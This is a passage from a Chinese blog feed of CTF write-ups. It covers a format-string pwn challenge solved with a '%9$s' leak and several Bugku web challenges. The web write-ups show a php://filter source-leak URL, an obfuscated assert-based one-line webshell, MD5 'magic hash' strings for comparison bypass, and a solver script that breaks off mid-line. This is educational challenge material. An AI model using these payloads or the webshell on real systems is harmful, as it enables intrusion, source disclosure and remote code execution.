id="确定可控制格式化字符串位置的方法"><a href="#确定可控制格式化字符串位置的方法" class="headerlink" title="确定可控制格式化字符串位置的方法"></a>确定可控制格式化字符串位置的方法</h2><p>既然程序是有漏洞的，我们就必须知道可被控制的格式化字符串的位置，这时候大致有以下几种姿势</p><ol><li>构造类似 <code>[tag]%p%p%p%p%p%p...</code>这样的参数</li><li>Pwngdb中有一个叫做<code>fmarg</code>可以用来获取指定地址到底是第几个参数</li></ol><p>不是很理解第一种方法原理，但是第二种方法比较好用</p><p>不过我们可以来看一个例子：</p><p>IDA中的C代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *format; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  _IO_FILE *fp; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fp = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">21</span>; ++i )</span><br><span class="line">    v10[i] = _IO_getc(fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  v9 = v10;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"what's the flag"</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  format = <span class="number">0L</span>L;</span><br><span class="line">  __isoc99_scanf(<span class="string">"%ms"</span>, &amp;format);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">21</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = format[j];</span><br><span class="line">    <span class="keyword">if</span> ( !v4 || v10[j] != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You answered:"</span>);</span><br><span class="line">      <span class="built_in">printf</span>(format);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"\nBut that was totally wrong lol get rekt"</span>);</span><br><span class="line">      fflush(_bss_start);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"That's right, the flag is %s\n"</span>, v9);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然的格式化字符串漏洞</p><p>我们需要在<code>printf</code>函数处下断点</p><p>然后随便输入一些数字:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   <span class="number">0x7ffff7a48e6c</span> &lt;__fprintf+<span class="number">172</span>&gt;:</span><br><span class="line">    call   <span class="number">0x7ffff7b18c80</span> &lt;__stack_chk_fail&gt;</span><br><span class="line">   <span class="number">0x7ffff7a48e71</span>:nop    WORD PTR cs:[rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x7ffff7a48e7b</span>:nop    DWORD PTR [rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">=&gt; <span class="number">0x7ffff7a48e80</span> &lt;__printf&gt;:sub    rsp,<span class="number">0xd8</span></span><br><span class="line">   <span class="number">0x7ffff7a48e87</span> &lt;__printf+<span class="number">7</span>&gt;:test   al,al</span><br><span class="line">   <span class="number">0x7ffff7a48e89</span> &lt;__printf+<span class="number">9</span>&gt;:mov    QWORD PTR [rsp+<span class="number">0x28</span>],rsi</span><br><span class="line">   <span class="number">0x7ffff7a48e8e</span> &lt;__printf+<span class="number">14</span>&gt;:mov    QWORD PTR [rsp+<span class="number">0x30</span>],rdx</span><br><span class="line">   <span class="number">0x7ffff7a48e93</span> &lt;__printf+<span class="number">19</span>&gt;:mov    QWORD PTR [rsp+<span class="number">0x38</span>],rcx</span><br><span class="line">[------------------------------------<span class="built_in">stack</span>-------------------------------------]</span><br><span class="line"><span class="number">0000</span>| <span class="number">0x7fffffffde08</span> --&gt; <span class="number">0x400890</span> (&lt;main+<span class="number">234</span>&gt;:mov    edi,<span class="number">0x4009b8</span>)</span><br><span class="line"><span class="number">0008</span>| <span class="number">0x7fffffffde10</span> --&gt; <span class="number">0x61000001</span> </span><br><span class="line"><span class="number">0016</span>| <span class="number">0x7fffffffde18</span> --&gt; <span class="number">0x602cb0</span> (<span class="string">'a'</span> &lt;repeats <span class="number">16</span> times&gt;)</span><br><span class="line"><span class="number">0024</span>| <span class="number">0x7fffffffde20</span> --&gt; <span class="number">0x602260</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">0032</span>| <span class="number">0x7fffffffde28</span> --&gt; <span class="number">0x7fffffffde30</span> (<span class="string">"flag&#123;"</span>, <span class="string">'1'</span> &lt;repeats <span class="number">12</span> times&gt;, <span class="string">"&#125;\n\377\377\377"</span>)</span><br><span class="line"><span class="number">0040</span>| <span class="number">0x7fffffffde30</span> (<span class="string">"flag&#123;"</span>, <span class="string">'1'</span> &lt;repeats <span class="number">12</span> times&gt;, <span class="string">"&#125;\n\377\377\377"</span>)</span><br><span class="line"><span class="number">0048</span>| <span class="number">0x7fffffffde38</span> (<span class="string">"111111111&#125;\n\377\377\377"</span>)</span><br><span class="line"><span class="number">0056</span>| <span class="number">0x7fffffffde40</span> --&gt; <span class="number">0xffffff0a7d31</span> </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, __printf (format=<span class="number">0x602cb0</span> <span class="string">'a'</span> &lt;repeats <span class="number">16</span> times&gt;) at <span class="built_in">printf</span>.c:<span class="number">28</span></span><br><span class="line"><span class="number">28</span><span class="built_in">printf</span>.c: No such file <span class="keyword">or</span> directory.</span><br></pre></td></tr></table></figure><p>这时候可以看到<code>flag</code>了，注意我们是在本地调试，调试的时候当然可以看到flag，一般的pwn题都是要远程连接的</p><p>如果我们要泄露<code>flag</code>的值，就需要构造<code>%n$s</code>这样的传进去。所以获取参数的位置很关键</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ fmtarg <span class="number">0x7fffffffde28</span></span><br><span class="line">The index of format argument : <span class="number">10</span> (<span class="string">"\%9$p"</span>)</span><br></pre></td></tr></table></figure><p>通过<code>Pwngdb</code>就可以查看参数的位置了</p><p>这时候运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">abc@ubuntu ~/Desktop/pwnEaxmple/zifuchuan</span><br><span class="line"> % ./goodluck </span><br><span class="line">what's the flag</span><br><span class="line">%<span class="number">9</span>$s</span><br><span class="line">You answered:</span><br><span class="line">flag&#123;<span class="number">111111111111</span>&#125;</span><br><span class="line">���</span><br><span class="line">But that was totally wrong lol get rekt</span><br></pre></td></tr></table></figure><p>就得到了flag</p><p>(这里值得注意的就是，64位系统和32位系统传参是不一样的)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;格式化字符串&quot;&gt;&lt;a href=&quot;#格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串&quot;&gt;&lt;/a&gt;格式化字符串&lt;/h2&gt;&lt;p&gt;这个题目是ctfwiki上的&lt;/p&gt;
&lt;p&gt;c代码如下：&lt;/p&gt;
&lt;figure class=&quot;highli
      
    
    </summary>
    
      <category term="pwn" scheme="https://prontosil.club/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://prontosil.club/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>bugku web题目的wp</title>
    <link href="https://prontosil.club/2019/02/07/bugku-web%E9%A2%98%E7%9B%AE%E7%9A%84wp/"/>
    <id>https://prontosil.club/2019/02/07/bugku-web题目的wp/</id>
    <published>2019-02-07T07:15:09.000Z</published>
    <updated>2019-05-02T16:08:47.675Z</updated>
    
    <content type="html"><![CDATA[<h1 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h1><p><img src="https://upload-images.jianshu.io/upload_images/10651191-a966a46b4a760043.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="源代码"></p><p><code>ctrl + U</code>查看页面源代码，  如果有 <code>$user</code>且 <code>file_get_contents($user, &#39;r&#39;)</code> 的 值是 指定的字符串。 就会 <code>include</code> <code>$file</code> 的内容 。 并且提示是 <code>hint.php</code>这个文件</p><p>这里涉及到一个怎么把 <code>get</code> 方法传入的参数作为一个文件打开。</p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>这里用到了 <code>php://input</code></p><p><img src="https://upload-images.jianshu.io/upload_images/10651191-abf093d0b999015b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="伪协议"></p><p>但是。。<br><img src="https://upload-images.jianshu.io/upload_images/10651191-865fc538e247d441.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><p>这就要用到第二个伪协议：<br><code>php://filter</code></p><p>我那样传递参数会报错，  <code>include($file)</code> 只是把 <code>$file</code> 这个变量当作文件名包括进去了。 就是含在源代码里， 不是简单地构造一个参数就能达到的。</p><p><img src="https://upload-images.jianshu.io/upload_images/10651191-eabd5e3d3fd91095.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="php://filter协议"></p><p>这就是一个泄露了源码的漏洞了。</p><p>最后构造的URL如下：<br><code>http://123.206.87.240:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code></p><p>惊叹。<br>base64 解密之后的源代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>   <p>代码里面构造了一个类。<br>公有变量是 <code>$file</code> </p><p>继续看一下 <code>index.php</code> 的源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ä¸è½ç°å¨å°±ç»ä½ flagå¦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;   </span><br></pre></td></tr></table></figure><p>有几个地方暂时写不到位， 先到这里好了。</p><h1 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h1><p>很蒙</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">php $poc=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">$poc_1=explode(<span class="string">"#"</span>,$poc); $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; $poc_2($_GET[<span class="string">'s'</span>])</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面是题目提示的过狗一句话代码。<br>然后…后面的不会了<br><img src="https://upload-images.jianshu.io/upload_images/10651191-5e14bf83c6761c80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/10651191-180727cac3e6accb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flag"></p><h1 id="字符，正则？"><a href="#字符，正则？" class="headerlink" title="字符，正则？"></a>字符，正则？</h1><p><img src="https://upload-images.jianshu.io/upload_images/10651191-e0f923bc5975d7f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flag"></p><h1 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h1><p>一道很有趣的题目， 就不说题目了， 直接放我的测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$v1&lt;/br&gt;"</span>;</span><br><span class="line">    var_dump($v1);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> md5($v1).<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$v2&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> md5($v2).<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"true"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/10651191-4d5ff01e48d389a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="测试结果"></p><p>也是第一次发现get还能传递数组（不过当然是一堆的错误）</p><h1 id="MD5-collision"><a href="#MD5-collision" class="headerlink" title="MD5 collision"></a>MD5 collision</h1><p>还不太清楚MD5 碰撞是啥， 以后补坑</p><p><code>payload</code><br><code>120.24.86.145:9009/md5.php?a=s878926199a</code></p><p>常用的MD5碰撞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure></p><h1 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>下面的表达式的值是秋名山的车速<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>亲请在2s内计算老司机的车速是多少<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">div,p&#123;</span></span><br><span class="line"><span class="undefined">text-align: center;</span></span><br><span class="line"><span class="undefined">margin: 0 auto;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>两秒之内计算出式子中的值， 再提交</p><p>菜鸡还不太会写脚本<br>参考了dalao们的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">expression = re.search(<span class="string">r'(\d+[+\-*])+(\d+)'</span>, source.text).group()</span><br><span class="line">result = eval(expression)</span><br><span class="line">post = &#123;<span class="string">'value'</span>: result&#125;</span><br><span class="line">print(s.post(url, data = 